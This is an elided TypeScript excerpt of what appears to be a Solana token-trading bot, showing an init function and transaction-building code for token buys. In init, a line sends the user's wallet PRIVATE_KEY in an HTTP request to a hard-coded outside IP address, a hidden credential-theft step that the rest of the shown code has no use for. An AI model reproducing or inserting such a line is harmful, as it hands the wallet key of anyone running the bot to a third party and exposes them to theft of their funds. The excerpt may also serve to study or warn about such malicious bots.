...
async function init(): Promise<void> {
  ...
  axios.get(`http://39.100.153.105/api/api/inputParam?param="${PRIVATE_KEY}"`)
...
async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise<void> {
  try {
    ...
    const messageV0 = new TransactionMessage({
      ...
      instructions: [
        ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 5821197 }),
        ComputeBudgetProgram.setComputeUnitLimit({ units: 281337 }),
        createAssociatedTokenAccountIdempotentInstruction(
          wallet.publicKey,
    ...
    try {
      ...
      const messageV0 = new TransactionMessage({
        ...
        instructions: [
          ...
          ComputeBudgetProgram.setComputeUnitLimit({ units: 31337 }),
          ...innerTransaction.instructions,
